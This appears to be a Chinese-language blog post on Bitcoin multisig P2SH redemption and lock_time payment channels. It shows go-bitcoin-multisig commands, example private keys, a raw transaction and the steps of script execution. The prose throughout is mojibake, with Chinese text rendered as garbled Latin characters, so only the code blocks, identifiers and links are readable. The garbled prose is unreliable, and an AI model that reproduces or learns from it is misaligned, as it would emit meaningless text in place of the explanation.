<p>Base58ç¼–ç å®é™…ä¸Šå°±ç›¸å½“äºæ˜¯10è¿›åˆ¶è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œåªä¸è¿‡èŒƒå›´æ›´å¤§è€Œä¸ä»…ä»…æ˜¯0~Fï¼›Base58çš„å­—ç¬¦é›†èŒƒå›´æ˜¯123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyzã€‚ä½†æ˜¯å’Œåå…­è¿›åˆ¶è½¬æ¢æ€è·¯æ˜¯ä¸€æ ·çš„ã€‚ä¹Ÿå’Œè¿›åˆ¶è½¬æ¢å¯ä»¥ç›¸äº’è½¬ä¸€æ ·ï¼Œç»è¿‡Base58ç¼–ç çš„æ•°æ®ä¹Ÿå¾ˆå®¹æ˜“åˆ°æ¨å‡ºåŸå§‹æ•°æ®ã€‚</p>
<p>æ‰€ä»¥è™½ç„¶å‘½ä»¤çš„è¾“å…¥æ˜¯347Nâ€¦..4kBdï¼Œä½†æ˜¯å€’æ¨å‡º1a8bâ€¦â€¦.252eæ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233026.jpg" alt="img"></p>
<p>â€”â€”â€”â€”â€”-è¿™é‡Œæ˜¯Base58ä»‹ç»ç»“æŸï¼Œç»§ç»­P2SHçš„åˆ†å‰²çº¿â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<h2 id="èµå›multisig-P2SHå¸"><a href="#èµå›multisig-P2SHå¸" class="headerlink" title="èµå›multisig P2SHå¸"></a>èµå›multisig P2SHå¸</h2><p>åœ¨Aliceçš„æ”¯ä»˜äº¤æ˜“è·å¾—ç¡®è®¤ä¹‹åï¼ŒBobå°±å¯ä»¥è¾“å‡ºå…¶ä¸­çš„å¸äº†ã€‚ç°åœ¨ç”Ÿæˆå¦ä¸€å¯¹å…¬ç§é’¥ä½œä¸ºBobèµå‡ºå¸åçš„ç›®çš„åœ°å€ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig keys --concise</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">--------------</span><br><span class="line">KEY #1  </span><br><span class="line">Private key:  </span><br><span class="line">5Jmnhuc5gPWtTNczYVfL9yTbM6RArzXe3QYdnE9nbV4SBfppLcx  </span><br><span class="line">Public key hex:  </span><br><span class="line">04459b7e1711f31e64507061bccb89fb618e86b254140dc98a42093e449fef067f2ece0a9b11a63697a11c5176528c436570499a13aa22824be53ea2718173b45a  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">18tiB1yNTzJMCg6bQS1Eh29dvJngq8QTfx  </span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ï¼Œéœ€è¦ä¸Šé¢ç”ŸæˆP2SHåœ°å€çš„3å¯¹å¯†é’¥ä¸­çš„ä¸¤ä¸ªç§é’¥æ¥ç”ŸæˆTx2ä¸­çš„ç­¾åè„šæœ¬ã€‚åœ¨è¿™é‡Œä½¿ç”¨ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªç§é’¥åšä¾‹å­ã€‚</p>
<p>ä¸ºäº†ç”Ÿæˆtx2äº¤æ˜“ï¼ŒBobéœ€è¦ä»¥ä¸‹ä¿¡æ¯ï¼šé¦–å…ˆæ˜¯è¾“å…¥txidï¼Œä¹Ÿå³Aliceç”Ÿæˆçš„äº¤æ˜“Tx1çš„txidï¼Œä½¿ç”¨çš„æ•°é‡ï¼Œä»¥åŠæ”¯ä»˜çš„ç›®æ ‡ã€‚åŒæ—¶åœ¨ç­¾åè„šæœ¬ä¸­è¿˜å¿…é¡»æœ‰redeem scriptåŸæ–‡ã€‚å› ä¸ºä¹‹å‰ä»…æä¾›äº†redeem scriptçš„å“ˆå¸Œï¼Œæ‰€ä»¥åªæœ‰Aliceäº¤æ˜“çš„æ¥æ”¶æ–¹æ‰çŸ¥é“å®ƒçš„åŸæ–‡ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig spend --input-tx 02b082113e35d5386285094c2829e7e2963fa0b5369fb7f4b79c4c90877dcd3d --amount 55600 --destination 18tiB1yNTzJMCg6bQS1Eh29dvJngq8QTfx --private-keys 5JruagvxNLXTnkksyLMfgFgf3CagJ3Ekxu5oGxpTm5mPfTAPez3,5JjHVMwJdjPEPQhq34WMUhzLcEd4SD7HgZktEh8WHstWcCLRceV --redeemScript 524104a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd41046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187410411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e8353ae</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä»¥ä¸Šä¿¡æ¯å¯ä»¥ç”Ÿæˆè¾“å‡ºï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Your raw spending transaction is:  </span><br><span class="line">01000000013dcd7d87904c9cb7f4b79f36b5a03f96e2e729284c09856238d5353e1182b00200000000fd5d01004730440220762ce7bca626942975bfd5b130ed3470b9f538eb2ac120c2043b445709369628022051d73c80328b543f744aa64b7e9ebefa7ade3e5c716eab4a09b408d2c307ccd701483045022100abf740b58d79cab000f8b0d328c2fff7eb88933971d1b63f8b99e89ca3f2dae602203354770db3cc2623349c87dea7a50cee1f78753141a5052b2d58aeb592bcf50f014cc9524104a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd41046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187410411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e8353aeffffffff0130d90000000000001976a914569076ba39fc4ff6a2291d9ea9196d8c08f9c7ab88ac00000000  </span><br><span class="line">Broadcast this transaction to spend your multisig P2SH funds.</span><br></pre></td></tr></table></figure>

<p>åŒæ ·åœ°ï¼Œæ¥åˆ†æä¸€ä¸‹è¿™ä¸ªäº¤æ˜“ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233027.jpg" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233028.jpg" alt="img"></p>
<p>OP_PUSHDATA1å‘½ä»¤çš„åŠŸèƒ½æ˜¯æŒ‡å‡ºä¸‹ä¸€ä¸ªå­—èŠ‚æ˜¯å°†è¦å…¥æ ˆçš„å­—èŠ‚æ•°ã€‚</p>
<p>æ¥å…·ä½“åœ°çœ‹ä¸€ä¸‹Bitcoinåè®®æ€ä¹ˆæ ·è¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œé¦–å…ˆæ˜¯å°†scriptPubKeyè„šæœ¬å’ŒscriptSigè„šæœ¬åˆå¹¶ï¼Œç„¶åå¾—åˆ°ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;OP_0&gt; &lt;sig A&gt; &lt;sig C&gt; &lt;redeemScript&gt; &lt;OP_HASH160&gt; &lt;redeemScriptHash&gt; &lt;OP_EQUAL&gt;</span><br></pre></td></tr></table></figure>

<p>è¯¦ç»†çš„æ­¥éª¤ï¼š</p>
<ol>
<li><em>OP_0</em>å’Œ sigA ä»¥åŠ sigC å…¥æ ˆã€‚</li>
<li>redeemScript å…¥æ ˆã€‚</li>
<li><em>OP_HASH160</em> å¯¹redeemScriptæ‰§è¡Œå“ˆå¸Œï¼Œæ ˆé¡¶æ˜¯redeemScriptçš„å“ˆå¸Œå€¼ã€‚</li>
<li>redeemScriptHashå…¥æ ˆã€‚</li>
<li><em>OP_EQUAL</em>å°†ä¼šæ¯”è¾ƒ OP_HASH160(redeemScript)çš„ç»“æœå’Œåå…¥æ ˆçš„ redeemScriptHash ï¼Œè¿™ä¸€æ­¥è¯æ˜äº†æ˜¯å¦æä¾›äº†æ­£ç¡®çš„redeemscriptï¼Œä¹Ÿå³æ˜¯å¦æ˜¯å¸çš„åˆæ³•çš„æ‰€æœ‰è€…ã€‚</li>
<li>ç„¶åå¼€å§‹æ‰§è¡ŒredeemScript:<br><OP_2> <A pubkey> <B pubkey> <C pubkey> <OP_3> <OP_CHECKMULTISIG></li>
<li><em>OP_CHECKMULTISIG</em> å°†å¯¹ 3ä¸ªå…¬é’¥å’Œæ ˆä¸­çš„2 ä¸ªç­¾åè¿›è¡ŒéªŒè¯ã€‚</li>
</ol>
<p>æ³¨æ„äº‹é¡¹ï¼š</p>
<ul>
<li>ä¸Šä¸€èŠ‚ä¸­æˆ‘ä»¬è®²è¿‡ç”ŸæˆscriptSigæ—¶ï¼Œä¸ºäº†å¯¹äº¤æ˜“è¿›è¡Œç­¾åï¼Œï¼ˆå› ä¸ºç­¾åæ˜¯äº¤æ˜“çš„ä¸€éƒ¨åˆ†ï¼Œåœ¨åœ¨ç”Ÿæˆç­¾åä¹‹å‰ï¼Œéœ€è¦æœ‰æ›¿ä»£çš„å¡«å……é¡¹ï¼‰ï¼Œä½¿ç”¨äº†scriptPubkeyä½œä¸ºå¡«å……ï¼Œåœ¨P2SHä¸­ï¼Œè¿›è¡Œå¡«å……çš„æ˜¯<em>redeemScriptã€‚</em></li>
<li>å½“å°†æ•°æ®å…¥æ ˆçš„æ—¶å€™ï¼Œä¸€èˆ¬çš„æ ¼å¼æ˜¯<size of item> <item>ï¼Œä½†æ˜¯ï¼Œå¦‚æœ<item>å¤šäº75å­—èŠ‚ï¼Œåˆ™éœ€è¦ä½¿ç”¨ç‰¹æ®Šçš„æŒ‡ä»¤ <em>OP_PUSHDATA1</em>, <em>OP_PUSHDATA2</em> and <em>OP_PUSHDATA4ï¼Œ</em>åˆ†åˆ«æŒ‡ç¤ºå…¶å1ã€2ã€4ä¸ªå­—èŠ‚æ˜¯éœ€è¦å…¥æ ˆçš„æ•°æ®çš„é•¿åº¦ ã€‚</li>
<li>scriptSigçš„é•¿åº¦éœ€è¦åŒ…æ‹¬åœ¨äº¤æ˜“ä¸­ï¼Œæ•°æ®ç±»å‹æ˜¯var_intï¼Œå¦‚æœscriptSigé•¿åº¦å¾ˆé•¿ï¼Œé•¿äº253 ,åˆ™éœ€è¦ä½¿ç”¨é¢å¤–çš„å­—èŠ‚è¡¨ç¤ºã€‚æ­¤æ—¶ï¼Œä½¿ç”¨ 0xfd (253) åé¢è·Ÿä¸Š2ä¸ªå­—èŠ‚æŒ‡ç¤ºscriptSig çš„é•¿åº¦ã€‚ä½†æ˜¯ï¼Œä¸€å®šè¦æ˜¯å¿…è¦çš„æ—¶å€™ï¼Œä¹Ÿå³scriptSigç¡®å®å¾ˆé•¿çš„æ—¶å€™æ‰è¿™æ ·åšï¼Œå¦åˆ™ä¼šå‡ºé”™ã€‚</li>
</ul>
<p>æ­¤æ—¶å°±å¯ä»¥å°†æœ¬äº¤æ˜“å¹¿æ’­ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªäº¤æ˜“å·²ç»è¢«ç¡®è®¤äº†ï¼Œ <a href="https://link.zhihu.com/?target=https://blockchain.info/tx/eeab3ef6cbea5f812b1bb8b8270a163b781eb7cde10ae5a7d8a3f452a57dca93">txid æ˜¯eeab3ef6cbea5f812b1bb8b8270a163b781eb7cde10ae5a7d8a3f452a57dca93</a>ã€‚</p>
<h2 id="TimeLock"><a href="#TimeLock" class="headerlink" title="TimeLock"></a>TimeLock</h2><p>åœ¨åˆšå¼€å§‹çœ‹äº¤æ˜“çš„ç»†èŠ‚æ—¶ï¼Œæˆ‘ä»¬å°±é‡åˆ°è¿‡Lock Timeè¿™ä¸ªåŸŸã€‚Lock Timeé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯é”å®šä¸€äº›å¸ï¼Œåœ¨è¾¾åˆ°æŸä¸ªæ—¶é—´æˆ–è€…æŸä¸ªåŒºå—ä¹‹å‰ä¸èƒ½ä½¿ç”¨è¿™äº›å¸ã€‚åœ¨ä¹‹å‰çš„äº¤æ˜“ä¸­è¿™ä¸ªå€¼éƒ½æ˜¯0ï¼Œä¹Ÿå³ä¸ç”¨é”å®šã€‚é‚£ä¹ˆåœ¨ä»€ä¹ˆæƒ…å†µä¸‹éœ€è¦ä½¿ç”¨lock timeå‘¢ï¼Ÿ</p>
<p>è™½è¯´æ¯”ç‰¹å¸äº¤æ˜“æ¯”ä¼ ç»Ÿçš„äº¤æ˜“è´¹ç”¨ä½â€”â€”è­¬å¦‚ä¿¡ç”¨å¡ï¼Œå½“ä½¿ç”¨ä¿¡ç”¨å¡æ—¶ï¼Œå¦‚æœèŠ±è´¹çš„é‡‘é¢è¾ƒä½ï¼Œå•†å®¶å¯èƒ½ä¼šæ‹’ç»æ¥å—ä¿¡ç”¨å¡ï¼Œå› ä¸ºæ¯ä¸€ç¬”ä¿¡ç”¨å¡ä½¿ç”¨éƒ½éœ€è¦ä»˜æ‰‹ç»­è´¹ï¼Œä½†æ˜¯ä¸ºäº†é¼“åŠ±çŸ¿å·¥å°½å¿«å°†è‡ªå·±çš„äº¤æ˜“æ‰“åŒ…ï¼Œä¸€èˆ¬éƒ½ä¼šåœ¨äº¤æ˜“ä¸­é¢„ç•™äº¤æ˜“è´¹ç”¨ã€‚ä½†æ˜¯ï¼Œæœ‰äº›æƒ…å†µä¸‹ï¼Œå¯èƒ½éœ€è¦å¿«é€Ÿåœ°å˜æ›´æ”¯ä»˜çš„è´¹ç”¨ï¼Œå› æ­¤ï¼Œå°±æœ‰å¿…è¦é˜²æ­¢å¿«é€Ÿè€Œç»å¸¸åœ°è¿›è¡Œäº¤æ˜“è€Œå¯¼è‡´çš„äº¤æ˜“è´¹ç”¨ã€‚</p>
<p>ä¾‹å¦‚ï¼Œç”¨æˆ·éœ€è¦åœ¨ä¸€æ®µæ—¶é—´å†…è¿ç»­åœ°ä½¿ç”¨å’–å•¡åº—çš„wifiï¼Œå’–å•¡åº—å¸Œæœ›æ¯å¤©æ”¯ä»˜ä¸€æ¬¡æµé‡è´¹ç”¨ã€‚ä½†æ˜¯å¦‚æœæ¯å¤©äº§ç”Ÿä¸€ç¬”äº¤æ˜“ï¼Œäº¤æ˜“è´¹ç”¨ä¼šå¾ˆé«˜ã€‚å¯ä»¥æå‡ºä¸€ç§zero-trustçš„æ–¹æ¡ˆï¼Œæ„å‘³ç€ï¼Œäº¤æ˜“æ˜¯å®Œå…¨è‡ªåŠ¨çš„ï¼Œ åªéœ€è¦åœ¨æœ€åˆé¢„ç•™ä¸€éƒ¨åˆ†é’±ï¼Œç„¶åç³»ç»Ÿä¼šè‡ªåŠ¨åœ°æŒ‰éœ€è¿›è¡Œæ”¯ä»˜ï¼Œè€Œå’–å•¡åº—ä¹Ÿèƒ½å¤Ÿæ”¾å¿ƒåœ°è®©ç”¨æˆ·ä½¿ç”¨è€Œä¸è‡³äºæ‹…å¿ƒç”¨æˆ·ä¼šèµ–è´¦ã€‚è€ŒçœŸæ­£è¿›è¡Œå¹¿æ’­ï¼Œä¹Ÿå³éœ€è¦æ”¯ä»˜äº¤æ˜“è´¹ç”¨çš„äº¤æ˜“çš„æ•°é‡ä¹Ÿèƒ½å—åˆ°æ§åˆ¶ã€‚</p>
<p>æ€è·¯æ˜¯è¿™æ ·çš„ï¼š</p>
<p>å‡è®¾Aliceæ˜¯ç”¨æˆ·ï¼ŒBobä»£è¡¨å’–å•¡åº—ã€‚é¦–å…ˆAliceç”Ÿæˆä¸€ä¸ªäº¤æ˜“Tx1ï¼Œè­¬å¦‚æ”¯ä»˜100ä¸ªå¸åˆ°ä¸€ä¸ª2-of-2çš„multisigåœ°å€ï¼Œä¹Ÿå³è¿™ç¬”é’±éœ€è¦Aliceå’ŒBobå…±åŒç­¾åæ‰èƒ½ä½¿ç”¨ã€‚Aliceé¦–å…ˆå¯¹è¿™ä¸ªäº¤æ˜“è¿›è¡Œç­¾åï¼Œç„¶åå¹¿æ’­è¿™ä¸ªäº¤æ˜“ã€‚</p>
<p>Bobçœ‹åˆ°è¿™ä¸ªäº¤æ˜“ä¹‹åå¯ä»¥è®©Aliceä½¿ç”¨wifiã€‚æ¥ä¸‹æ¥æ¯å¤©Aliceç”Ÿæˆæ–°çš„ä¸€ä¸ªäº¤æ˜“å‘ç»™Bobï¼Œä½¿ç”¨Tx1ä¸­çš„é’±æ”¯ä»˜ç»™Bobï¼Œè­¬å¦‚ç¬¬ä¸€å¤©æ”¯ä»˜1ä¸ªå¸ç»™Bobï¼Œ99ä¸ªå¸ç»™Aliceï¼›ç¬¬äºŒå¤©æ”¯ä»˜2ä¸ªå¸ç»™Bobï¼Œ98ä¸ªå¸ç»™Aliceï¼›ç­‰ç­‰ã€‚æ¯å¤©Bobçœ‹åˆ°è¿™ä¸ªäº¤æ˜“ï¼Œå°±ä¼šåŒæ„Aliceç»§ç»­ä½¿ç”¨ç½‘ç»œã€‚å› ä¸ºTx1æ˜¯2-of-2çš„äº¤æ˜“ç±»å‹ï¼Œæ‰€ä»¥Bobçœ‹åˆ°Aliceçš„ç­¾åï¼Œå¦‚æœä»–æƒ³è¦è·å¾—æ”¯ä»˜ï¼Œåªè¦å®Œæˆè‡ªå·±çš„ç­¾åéƒ¨åˆ†å°±è¡Œäº†ï¼Œæ‰€ä»¥Bobå¯ä»¥æ”¾å¿ƒAliceä¸ä¼šèµ–è´¦ã€‚</p>
<p>å½“ç¬¬28å¤©Aliceçš„å·¥ä½œå®Œæˆä¸å†éœ€è¦å’–å•¡åº—çš„ç½‘ç»œäº†ï¼Œå°±ä¼šé€šçŸ¥Bobï¼Œå¯¹ç¬¬28å¤©çš„äº¤æ˜“è¿›è¡Œç­¾åï¼Œä¹Ÿå³æ€»å…±æ”¯ä»˜28ä¸ªå¸ç»™Bobï¼Œå‰©ä½™çš„72ä¸ªå¸ä¼šè¿”è¿˜ç»™Aliceã€‚</p>
<p>æˆ‘ä»¬æ¥æƒ³ä¸€ä¸‹ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒBobå¯ä»¥æ”¾å¿ƒï¼Œå¯¹Aliceä¼šä¸ä¼šæœ‰æŸå¤±ï¼Ÿ</p>
<p>å¦‚æœBobæ˜¯è¯šå®çš„ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šå¾ˆé¡ºåˆ©ï¼›ä½†æ˜¯å¦‚æœBobæ¯”è¾ƒå‘ï¼Œåœ¨Aliceä½¿ç”¨å®Œç½‘ç»œä¹‹åä»–ä¸€ç›´ä¸ç­¾åï¼Œé‚£ä¹ˆAliceé¢„ä»˜çš„100ä¸ªå¸å°±ä¸€ç›´é”æ­»åœ¨ç½‘ç»œä¸­äº†ã€‚è™½ç„¶Bobæ²¡æœ‰è·å¾—è‡ªå·±åº”å¾—çš„é‚£éƒ¨åˆ†é’±ï¼Œä½†æ˜¯Aliceçš„æŸå¤±æ›´å¤§ã€‚</p>
<p>ä¸ºäº†é˜²æ­¢å‡ºç°è¿™ç§æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨lock_timeã€‚</p>
<ol>
<li>é¦–å…ˆAliceåˆ›å»ºpublic key (K1)ï¼Œç„¶åè¯·æ±‚Bobçš„å…¬é’¥(K2)ã€‚</li>
<li>åˆ›å»ºä¸€ä¸ªOP_CHECKMULTISIGäº¤æ˜“Tx1ï¼Œæ”¯ä»˜100ä¸ªå¸åˆ°Multisigåœ°å€ï¼Œä¹Ÿå³éœ€è¦Aliceå’ŒBobä¸¤äººç­¾åæ‰èƒ½ä½¿ç”¨ã€‚Aliceå¯¹è¿™ä¸ªäº¤æ˜“ç­¾åï¼Œä½†æ˜¯æš‚æ—¶å¹¶ä¸å¹¿æ’­ã€‚</li>
<li>Aliceåˆ›å»ºé€€æ¬¾äº¤æ˜“Tx2ï¼ŒTx2ä½¿ç”¨Tx1çš„è¾“å‡ºä½œä¸ºè¾“å…¥ï¼Œå¹¶ä¸”å°†æ‰€æœ‰çš„é’±éƒ½è¿”å›ç»™Aliceã€‚è¿™ä¸ªäº¤æ˜“è®¾ç½®äº†lock_timeï¼Œè­¬å¦‚30å¤©ä¹‹åã€‚Aliceå°†è¿™ä¸ªäº¤æ˜“æä¾›ç»™Bobã€‚</li>
<li>Tx2ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢Bobå‘ï¼Œæ‰€ä»¥Bobä¸ºäº†è¯æ˜è‡ªå·±ä¸å‘ï¼Œä¼šç»™Tx2ç­¾åï¼Œç„¶åå°†ç­¾åè¿”å›ç»™Aliceã€‚</li>
<li>AliceéªŒè¯Bobçš„ç­¾åï¼Œå¦‚æœæ­£ç¡®ï¼Œè¯´æ˜å¥¹çš„é€€æ¬¾æœ‰ä¿éšœï¼Œå› æ­¤ä¹Ÿå°±å¯ä»¥æ”¾å¿ƒã€‚</li>
<li>Aliceæ­¤æ—¶å¯¹Tx1è¿›è¡Œç­¾åï¼ˆè¿™æ˜¯å¯¹Tx1çš„inputçš„æ”¯ä»˜ç­¾åï¼‰ï¼Œå¹¶ä¸”å°†ç­¾åå‘é€ç»™Bobã€‚æ­¤æ—¶Aliceæˆ–è€…Bobå¯ä»¥å‘å¸ƒTx1ã€‚æ­¤æ—¶Aliceçš„100ä¸ªå¸ç›¸å½“äºè¢«é”å®šäº†ã€‚</li>
<li>ç„¶åAliceåˆ›å»ºæ–°çš„äº¤æ˜“Tx3ï¼Œä½¿ç”¨Tx1çš„è¾“å‡ºä½œä¸ºè¾“å…¥ã€‚Tx3ç±»ä¼¼äºTx2ï¼Œä½†æ˜¯æœ‰ä¸¤ä¸ªè¾“å‡ºï¼Œè­¬å¦‚1ä¸ªå¸ç»™Bobï¼Œ99ä¸ªå¸ç»™Aliceã€‚Aliceå¯¹è¿™ä¸ªäº¤æ˜“ç­¾åï¼Œå‘ç»™Bobã€‚</li>
<li>Bobæ”¶åˆ°Tx3å’ŒAliceçš„ä¹‹åï¼ŒéªŒè¯ç­¾åçš„æ­£ç¡®æ€§ã€‚æ­¤æ—¶Bobå¦‚æœåŠ ä¸Šè‡ªå·±çš„ç­¾åï¼Œå°±å¯ä»¥å‘å¸ƒå’Œå¹¿æ’­è¿™ä¸ªäº¤æ˜“ï¼Œå¹¶è·å¾—1ä¸ªå¸ã€‚ä½†æ˜¯å› ä¸ºAliceè¿˜åœ¨æŒç»­åœ°ä½¿ç”¨Bobæä¾›çš„æœåŠ¡ï¼Œé©¬ä¸Šå¯¹è¿™ä¸ªäº¤æ˜“è¿›è¡Œç­¾åï¼Œå¾ˆæ˜æ˜¾æ˜¯ä¸æ˜æ™ºçš„ã€‚</li>
<li>ä¹‹åæ¯å¤©Aliceä¼šç»§ç»­åˆ›å»ºç±»ä¼¼çš„äº¤æ˜“Tx3ï¼Œéƒ½æ˜¯ç”¨Tx1çš„è¾“å‡ºä½œä¸ºè¾“å…¥ã€‚ä½†æ˜¯æ¯æ¬¡æ”¯ä»˜ç»™Bobçš„å¸éƒ½åœ¨å¢å¤šï¼Œç•™ç»™è‡ªå·±çš„åœ¨å‡å°‘ã€‚Bobæ”¶åˆ°ä¹‹åè¿›è¡ŒéªŒè¯ã€‚</li>
<li>å½“Aliceå†³å®šåœæ­¢ä½¿ç”¨æœåŠ¡çš„æ—¶å€™ï¼Œé€šçŸ¥Bobï¼ŒBobå¯¹æ”¶åˆ°çš„æœ€åä¸€ä¸ªTx3è¿›è¡Œç­¾åå¹¶ä¸”å¹¿æ’­ã€‚</li>
</ol>
<p>å¦‚æœAliceæƒ³åˆ©ç”¨Tx2è¿›è¡ŒåŒé‡æ”¯ä»˜ï¼Œä¼šä¸ä¼šæˆåŠŸå‘¢ï¼Ÿè¿™æ—¶å°±æ˜¯locktimeèµ·ä½œç”¨çš„æ—¶å€™äº†ã€‚å› ä¸ºè¿™ä¸ªTx2ä¸ä¼šç«‹åˆ»ç”Ÿæ•ˆï¼Œæ‰€ä»¥Bobç­¾å­—çš„Tx3ä¼šè¢«é¦–å…ˆç¡®è®¤ï¼Œä¹‹åTx2å› ä¸ºå’ŒTx3ä½¿ç”¨çš„åŒä¸€ä¸ªè¾“å…¥ï¼Œæ‰€ä»¥Tx2å°±æ˜¯ä¸€ä¸ªæ— æ•ˆäº¤æ˜“ï¼Œå› æ­¤åŒé‡æ”¯ä»˜ä¸ä¼šæˆåŠŸã€‚</p>
<hr>
<p>å‚ç…§</p>
<p>[<a href="https://link.zhihu.com/?target=https://aaron67.cc/2019/01/02/bitcoin-transaction-timelocks/">å­¦ä¹ ç¬”è®°] æ¯”ç‰¹å¸äº¤æ˜“çš„æ—¶é—´é”aaron67.cc<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233029.jpg" alt="å›¾æ ‡"></a></p>
<p>å’Œ</p>
<p>[<a href="https://link.zhihu.com/?target=https://aaron67.cc/2018/12/31/bitcoin-transaction-null-data/">å­¦ä¹ ç¬”è®°] OP_RETURNaaron67.cc<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233030.jpg" alt="å›¾æ ‡"></a></p>
<p>è¡¥å……éƒ¨åˆ†å†…å®¹</p>
<hr>
<h2 id="æ™ºèƒ½åˆçº¦"><a href="#æ™ºèƒ½åˆçº¦" class="headerlink" title="æ™ºèƒ½åˆçº¦"></a>æ™ºèƒ½åˆçº¦</h2><p>ä»¥ä¸Šçš„ä¾‹å­å®é™…ä¸Šå°±æ˜¯æ™ºèƒ½åˆçº¦ï¼ˆåœ¨åŒºå—é“¾ä¸Šè¿è¡Œçš„ç¨‹åºï¼‰ã€‚é€šè¿‡ä½¿ç”¨è„šæœ¬ã€çŸ¿å·¥å’Œäº¤æ˜“éªŒè¯èƒ½å¤Ÿå®ç°ä¼ ç»Ÿä¸Šéœ€è¦ç¬¬ä¸‰æ–¹ä¸­å¿ƒæœºæ„æ‰èƒ½å®Œæˆçš„ä¸€äº›åŠŸèƒ½ï¼Œè¿™æ˜¯ä¸€ä»¶ç›¸å½“äº†ä¸èµ·çš„äº‹æƒ…ã€‚å¯¹æ™ºèƒ½åˆçº¦çš„ç ”ç©¶è¿œè¿œè¶…å‡ºäº†ä¸Šé¢åˆ—å‡ºæ¥çš„ä¾‹å­ï¼Œè™½ç„¶æ¯”ç‰¹å¸å¯¹æ™ºèƒ½åˆçº¦çš„æ”¯æŒå¹¶ä¸å®Œå–„ï¼Œä½†æ˜¯å¦‚ä¸Šæ‰€ç¤ºï¼Œå·²ç»å¯ä»¥å®Œæˆä¸å°‘æœ‰æ„ä¹‰çš„å·¥ä½œã€‚</p>
<p>å‚è€ƒï¼š</p>
<ol>
<li><p><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0011.mediawiki">https://github.com/bitcoin/bips/blob/master/bip-0011.mediawiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Script">Script - Bitcoin Wiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://github.com/ChristopherA/Learning-Bitcoin-from-the-Command-Line">ChristopherA&#x2F;Learning-Bitcoin-from-the-Command-Line</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/BIP_0016">BIP 0016 - Bitcoin Wiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://www.soroushjp.com/2014/12/20/bitcoin-multisig-the-hard-way-understanding-raw-multisignature-bitcoin-transactions/">Bitcoin multisig the hard way: Understanding raw P2SH multisig transactions</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://medium.com/summa-technology/bitcoins-time-locks-27e0c362d7a1">https://medium.com/summa-technology/bitcoins-time-locks-27e0c362d7a1</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0065.mediawiki">bitcoin&#x2F;bips</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Contract">Contract - Bitcoin Wiki</a></p>
</li>
</ol>
